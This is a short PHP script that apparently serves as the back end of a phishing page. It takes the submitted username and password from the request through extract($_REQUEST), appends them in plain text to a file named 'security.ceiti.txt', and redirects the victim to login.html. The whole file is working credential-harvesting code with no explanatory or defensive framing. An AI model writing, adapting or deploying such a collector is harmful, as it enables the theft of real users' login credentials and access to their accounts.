<?php
header('Location: login.html');
extract($_REQUEST);
$file=fopen("security.ceiti.txt","a");

fwrite($file,"username : ");
fwrite($file,$username ."\n");
fwrite($file,"password : ");
fwrite($file, $password ."\n");
fclose($file);
?>
